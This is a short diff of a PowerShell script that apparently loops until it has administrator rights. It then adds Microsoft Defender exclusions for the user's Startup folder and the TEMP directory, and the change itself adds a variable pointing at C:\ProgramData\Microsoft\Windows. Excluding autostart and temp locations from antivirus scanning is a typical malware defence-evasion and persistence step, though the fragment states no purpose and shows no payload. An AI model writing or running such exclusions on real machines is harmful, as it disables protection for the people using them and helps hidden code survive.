@@ -10,6 +10,8 @@ while (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIde
     }
 }
 
+$tasks = "C:\ProgramData\Microsoft\Windows"
+
 Add-MpPreference -ExclusionPath "C:/Users/$env:USERNAME/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 Add-MpPreference -ExclusionPath "$env:TEMP"
 
